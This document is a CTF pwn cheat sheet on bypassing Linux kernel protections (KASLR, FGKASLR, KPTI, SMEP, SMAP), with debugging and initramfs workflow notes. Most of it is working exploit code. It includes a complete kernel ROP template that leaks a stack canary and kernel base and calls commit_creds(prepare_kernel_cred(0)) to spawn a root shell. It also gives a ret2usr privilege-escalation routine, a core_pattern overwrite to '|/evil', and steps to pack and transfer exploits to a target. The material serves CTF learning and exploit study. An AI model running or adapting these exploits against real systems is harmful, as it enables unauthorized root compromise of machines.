# CTF Pwn - Kernel Protection Bypass

## Table of Contents
- [KASLR and FGKASLR Bypass](#kaslr-and-fgkaslr-bypass)
  - [KASLR Bypass via Stack Leak (hxp CTF 2020)](#kaslr-bypass-via-stack-leak-hxp-ctf-2020)
  - [FGKASLR Bypass (hxp CTF 2020)](#fgkaslr-bypass-hxp-ctf-2020)
- [KPTI Bypass Methods](#kpti-bypass-methods)
  - [Method 1: swapgs_restore Trampoline](#method-1-swapgs_restore-trampoline)
  - [Method 2: Signal Handler (SIGSEGV)](#method-2-signal-handler-sigsegv)
  - [Method 3: modprobe_path via ROP](#method-3-modprobe_path-via-rop)
  - [Method 4: core_pattern via ROP](#method-4-core_pattern-via-rop)
- [SMEP / SMAP Bypass](#smep--smap-bypass)
- [KPTI / SMEP / SMAP Quick Reference](#kpti--smep--smap-quick-reference)
- [GDB Kernel Module Debugging](#gdb-kernel-module-debugging)
- [Initramfs and virtio-9p Workflow](#initramfs-and-virtio-9p-workflow)
- [Finding Symbol Offsets Without CONFIG_KALLSYMS_ALL](#finding-symbol-offsets-without-config_kallsyms_all)
- [Exploit Templates](#exploit-templates)
  - [Full Kernel ROP Template (SMEP + KPTI)](#full-kernel-rop-template-smep--kpti)
  - [ret2usr Template (No SMEP/SMAP)](#ret2usr-template-no-smepsmap)
- [Exploit Delivery](#exploit-delivery)

---

## KASLR and FGKASLR Bypass

### KASLR Bypass via Stack Leak (hxp CTF 2020)

Leak a kernel text pointer from the stack to compute the KASLR (Kernel Address Space Layout Randomization) slide:

```c
// Kernel base without KASLR
#define KERNEL_BASE 0xffffffff81000000

unsigned long leak[40];
read(fd, leak, sizeof(leak));  // oversized read from vulnerable module

// leak[38] contains a randomized kernel text pointer
unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - KERNEL_BASE;

// Apply offset to all addresses
unsigned long commit_creds_kaslr = commit_creds + kaslr_offset;
unsigned long pop_rdi_ret_kaslr = pop_rdi_ret + kaslr_offset;
```

**Other KASLR leak sources:**
- `/proc/kallsyms` (if `kptr_restrict != 1`)
- `dmesg` (if `dmesg_restrict != 1`)
- Kernel oops messages (if oops doesn't panic)
- UAF reading freed kernel objects containing text pointers
- `modprobe_path` has 1-byte entropy — brute-forceable with AAW

### FGKASLR Bypass (hxp CTF 2020)

FGKASLR (Function Granular KASLR) randomizes individual functions, but the early `.text` section (up to approximately offset `0x400dc6`) remains at a fixed offset from the kernel base. Gadgets from this range are safe to use.

**Method 1: Use only unaffected `.text` gadgets**

```bash
# Find gadgets only in the non-randomized range
ropr --no-uniq -R "^pop rdi; ret;|^swapgs" ./vmlinux | \
    awk -F: '{if (strtonum("0x"$1) < 0xffffffff81400dc6) print}'
```

`swapgs_restore_regs_and_return_to_usermode` is located in the unaffected `.text` section and can be used with only the KASLR base offset.

**Method 2: Resolve randomized functions via `__ksymtab`**

`__ksymtab` entries use relative offsets, not absolute addresses. The `__ksymtab` section itself is not randomized by FG-KASLR:

```c
// struct kernel_symbol { int value_offset; int name_offset; int namespace_offset; };
// Real address = &ksymtab_entry + entry.value_offset

unsigned long ksymtab_prepare_kernel_cred = 0xffffffff81f8d4fc; // from /proc/kallsyms
unsigned long ksymtab_commit_creds = 0xffffffff81f87d90;

// ROP chain to read ksymtab entry and compute real address:
// 1. Load ksymtab address into rax
payload[off++] = pop_rax_ret + kaslr_offset;
payload[off++] = ksymtab_prepare_kernel_cred + kaslr_offset;
// 2. Read 4-byte relative offset: mov eax, [rax]
payload[off++] = mov_eax_deref_rax_pop1_ret + kaslr_offset;
payload[off++] = 0x0;
// 3. Return to userland to compute: real_addr = ksymtab_addr + kaslr_offset + offset
payload[off++] = kpti_trampoline + kaslr_offset + 22;
payload[off++] = 0; payload[off++] = 0;
payload[off++] = (unsigned long)resolve_and_continue;
// ...

void resolve_and_continue() {
    // eax contains the relative offset read from ksymtab
    unsigned long resolved = ksymtab_prepare_kernel_cred + kaslr_offset + fetched_offset;
    // Now use resolved address in next ROP stage
}
```

**Key insight:** FG-KASLR requires a multi-stage exploit: first return to userland to compute resolved addresses from `__ksymtab` offsets, then re-enter the kernel with a second ROP chain using the resolved function addresses.

---

## KPTI Bypass Methods

KPTI (Kernel Page Table Isolation) separates kernel and user page tables. A simple `swapgs; iretq` fails because the user page table is not restored. Four bypass approaches:

### Method 1: swapgs_restore Trampoline

The kernel function `swapgs_restore_regs_and_return_to_usermode` handles the full KPTI return sequence. Jump to offset +22 to skip the register-restore prologue and land directly at the CR3-swap + `swapgs` + `iretq` sequence:

```c
// Symbol from /proc/kallsyms or vmlinux
unsigned long kpti_trampoline = 0xffffffff81200f10;

// In ROP chain, after commit_creds:
payload[off++] = kpti_trampoline + 22;  // skip to mov rdi,rsp; ... swapgs; iretq
payload[off++] = 0x0;                    // padding (popped by trampoline)
payload[off++] = 0x0;                    // padding
payload[off++] = user_rip;
payload[off++] = user_cs;
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;
```

**Key insight:** The +22 offset skips the function's register pop/restore sequence and enters directly at the point where it swaps CR3, does `swapgs`, and `iretq`. This offset may vary between kernel versions — verify by disassembling the function.

### Method 2: Signal Handler (SIGSEGV)

Register a SIGSEGV handler before the exploit. When `iretq` returns without KPTI handling, the page fault triggers SIGSEGV, which the handler catches to spawn a shell:

```c
#include <signal.h>

void spawn_shell() {
    if (getuid() == 0) system("/bin/sh");
}

// Before exploit:
struct sigaction sa;
sa.sa_handler = spawn_shell;
sigemptyset(&sa.sa_mask);
sa.sa_flags = 0;
sigaction(SIGSEGV, &sa, NULL);
```

The ROP chain still calls `commit_creds(prepare_kernel_cred(0))` and does `swapgs; iretq` to userland. Even though the return faults due to wrong page table, the credentials are already committed. The SIGSEGV handler runs with root privileges.

### Method 3: modprobe_path via ROP

Instead of returning to userland, overwrite `modprobe_path` directly from the kernel ROP chain using `pop rax; pop rdi; mov [rdi], rax; ret` gadgets. No KPTI handling needed — the write happens entirely in kernel context.

See [kernel.md - modprobe_path Overwrite](kernel.md#modprobe_path-overwrite) for the full technique, trigger sequence, and ROP payload.

### Method 4: core_pattern via ROP

Similar to Method 3 but overwrites `core_pattern` with a pipe command (e.g., `"|/evil"`). When any process crashes, the kernel executes the piped program as root.

See [kernel.md - core_pattern Overwrite](kernel.md#core_pattern-overwrite) for the full technique and how to find the `core_pattern` address.

---

## SMEP / SMAP Bypass

**SMEP (Supervisor Mode Execution Prevention):** Blocks executing userland pages from kernel mode.
- **Bypass:** Use kernel ROP (kROP) chains — all gadgets from kernel `.text`. See [kernel.md - Kernel ROP](kernel.md#kernel-rop-with-prepare_kernel_cred--commit_creds).

**SMAP (Supervisor Mode Access Prevention):** Blocks accessing userland memory from kernel mode.
- **Bypass:** kROP with heap-resident chain (all data in kernel heap), or `stac`/`clac` gadgets to temporarily disable SMAP.

**Direct CR4 modification (old kernels):** Write to CR4 to clear SMEP/SMAP bits. Blocked on modern kernels by `native_write_cr4()` pinning.

---

## KPTI / SMEP / SMAP Quick Reference

| Protection | Blocks | Bypass |
|-----------|--------|--------|
| SMEP | Executing userland pages from kernel | kROP (kernel ROP chain) — see [kernel.md](kernel.md#kernel-rop-with-prepare_kernel_cred--commit_creds) |
| SMAP | Accessing userland memory from kernel | kROP with heap-resident chain, `stac`/`clac` gadgets |
| No SMEP/SMAP | (nothing) | [ret2usr](kernel.md#ret2usr-no-smepsmap) — directly call userland privesc function |
| KPTI | Kernel page table isolation | [Trampoline](#method-1-swapgs_restore-trampoline), [signal handler](#method-2-signal-handler-sigsegv), [modprobe_path](#method-3-modprobe_path-via-rop), [core_pattern](#method-4-core_pattern-via-rop) |

See [KPTI Bypass Methods](#kpti-bypass-methods) for detailed bypass techniques with code.

---

## GDB Kernel Module Debugging

Load vulnerable kernel module symbols in GDB for source-level debugging:

```bash
# 1. Find module load address (as root inside QEMU)
cat /proc/modules
# vuln 16384 0 - Live 0xffffffffc0000000 (O)

# 2. In GDB, load module symbols at that address
(gdb) target remote localhost:1234
(gdb) add-symbol-file vuln.ko 0xffffffffc0000000
(gdb) b swrite            # breakpoint on module function
(gdb) c

# 3. Inspect stack after breakpoint hit
(gdb) x/20xg $rsp-0x90    # examine stack buffer
(gdb) search "AAAAAAAA"   # find buffer location (pwndbg)
```

**Note:** `/proc/modules` requires root to read actual addresses. Non-root users see zeroed addresses. Modify `/init` to keep root for debugging.

---

## Initramfs and virtio-9p Workflow

**Shared directory via virtio-9p** — transfer exploits between host and QEMU without rebuilding initramfs:
```bash
# Add to QEMU launch script:
-fsdev local,security_model=passthrough,id=fsdev0,path=./share \
-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare

# Inside QEMU guest (add to /init or run manually):
mkdir -p /home/ctf && mount -t 9p -o trans=virtio,version=9p2000.L hostshare /home/ctf

# On host, compile exploit into shared directory:
gcc exploit.c -static -o ./share/exploit
```

**Extract and modify initramfs:**
```bash
# Extract
mkdir initramfs && cd initramfs
gzip -dc ../initramfs.cpio.gz | cpio -idmv

# Modify /init for debugging (get root shell instead of unprivileged user)
# Comment out: exec su -l ctf
# Add: /bin/sh

# Rebuild
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
```

**Key modifications to `/init` for debugging:**
- Comment out `exec su -l ctf` (or similar) to keep root privileges
- Comment out `echo 1 > /proc/sys/kernel/kptr_restrict` to see `/proc/kallsyms`
- Comment out `echo 1 > /proc/sys/kernel/dmesg_restrict` to see dmesg
- Comment out `chmod 400 /proc/kallsyms` to read symbol addresses

---

## Finding Symbol Offsets Without CONFIG_KALLSYMS_ALL

`/proc/kallsyms` only shows `.text` symbols by default. Data symbols like `modprobe_path` and `core_pattern` require `CONFIG_KALLSYMS_ALL=y`.

**Finding modprobe_path:**

```bash
# 1. Get call_usermodehelper_setup address (always in /proc/kallsyms)
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. In GDB, set breakpoint and trigger
hb *0xffffffff810c8c80
# Trigger: echo -ne '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x

# 3. Check first argument (RDI = modprobe_path)
(gdb) p/x $rdi
# 0xffffffff8265ff00
(gdb) x/s $rdi
# "/sbin/modprobe"
```

**Finding core_pattern:**

```bash
# 1. Set breakpoint on override_creds (called by do_coredump)
# 2. Crash a process: gcc -static -o crash -xc - <<< 'int main(){((void(*)())0)();}'
# 3. After override_creds returns, disassemble — look for data address in movzx
```

---

## Exploit Templates

### Full Kernel ROP Template (SMEP + KPTI)

Complete exploit for kernel stack overflow with SMEP and KPTI enabled:

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

// Addresses from vmlinux (apply KASLR offset if needed)
unsigned long prepare_kernel_cred;
unsigned long commit_creds;
unsigned long pop_rdi_ret;
unsigned long mov_rdi_rax_pop1_ret;
unsigned long kpti_trampoline;

// Userland state
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_userland_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs;"
        "mov %[ss], ss;"
        "mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        ".att_syntax;"
        : [cs] "=r"(user_cs), [ss] "=r"(user_ss),
          [sp] "=r"(user_sp), [rflags] "=r"(user_rflags));
    user_rip = (unsigned long)spawn_shell;
}

void spawn_shell() {
    if (getuid() == 0) {
        printf("[+] root!\n");
        system("/bin/sh");
    } else {
        printf("[-] privesc failed\n");
        exit(1);
    }
}

int main() {
    save_userland_state();
    int fd = open("/dev/hackme", O_RDWR);

    // Step 1: Leak canary + KASLR base
    unsigned long leak[40];
    read(fd, leak, sizeof(leak));
    unsigned long cookie = leak[16];
    unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - 0xffffffff81000000;

    // Step 2: Apply KASLR offset
    prepare_kernel_cred += kaslr_offset;
    commit_creds += kaslr_offset;
    pop_rdi_ret += kaslr_offset;
    mov_rdi_rax_pop1_ret += kaslr_offset;
    kpti_trampoline += kaslr_offset;

    // Step 3: Build ROP chain
    unsigned long payload[50];
    int off = 16;
    payload[off++] = cookie;
    payload[off++] = 0;  // rbx
    payload[off++] = 0;  // r12
    payload[off++] = 0;  // rbp

    // prepare_kernel_cred(0) → commit_creds(result)
    payload[off++] = pop_rdi_ret;
    payload[off++] = 0;
    payload[off++] = prepare_kernel_cred;
    payload[off++] = mov_rdi_rax_pop1_ret;
    payload[off++] = 0;  // pop rbx padding
    payload[off++] = commit_creds;

    // KPTI-safe return to userland
    payload[off++] = kpti_trampoline + 22;
    payload[off++] = 0;  // padding
    payload[off++] = 0;  // padding
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    write(fd, payload, sizeof(payload));
    return 0;
}
```

### ret2usr Template (No SMEP/SMAP)

```c
void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"
        "mov r15, %[user_ss];   push r15;"
        "mov r15, %[user_sp];   push r15;"
        "mov r15, %[user_rflags]; push r15;"
        "mov r15, %[user_cs];   push r15;"
        "mov r15, %[user_rip];  push r15;"
        "iretq;"
        ".att_syntax;"
        : : [prepare_kernel_cred] "r"(prepare_kernel_cred),
            [commit_creds] "r"(commit_creds),
            [user_ss] "r"(user_ss), [user_sp] "r"(user_sp),
            [user_rflags] "r"(user_rflags),
            [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
}
```

---

## Exploit Delivery

Kernel exploits are typically large static binaries. Minimize size for remote delivery:

```bash
# 1. Compile with musl-libc (much smaller than glibc)
musl-gcc -static -O2 -o exploit exploit.c

# 2. Strip symbols
strip exploit

# 3. Compress and encode for transfer
gzip exploit && base64 exploit.gz > exploit.b64

# 4. On target: decode and decompress
base64 -d exploit.b64 | gunzip > /tmp/exploit && chmod +x /tmp/exploit

# Optional: UPX compression (further reduces size)
upx --best exploit
```

**Common pitfall:** If the exploit uses `setxattr()` with a file path, ensure the file exists in the remote environment. Local path (`/tmp/exploit`) may differ from remote path (`/home/user/exploit`).
